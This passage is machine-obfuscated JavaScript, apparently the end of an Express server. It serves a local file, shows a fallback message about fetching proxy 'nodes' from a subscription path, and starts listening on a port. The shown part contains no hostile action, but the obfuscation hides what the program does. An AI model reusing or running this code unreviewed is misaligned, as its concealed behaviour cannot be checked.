_0x862372=_0x5a6b7f;try{const _0x59b052=path['join'](__dirname,_0x862372(0x205)),_0x4335b9=await fs[_0x862372(0x25f)]['readFile'](_0x59b052,_0x862372(0x21b));_0x48c15a[_0x862372(0x1f0)](_0x4335b9);}catch(_0x87990c){_0x48c15a['send']('Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!');}}),app[_0x5a6b7f(0x25a)](PORT,()=>console['log'](_0x5a6b7f(0x1fb)+PORT+'!'));
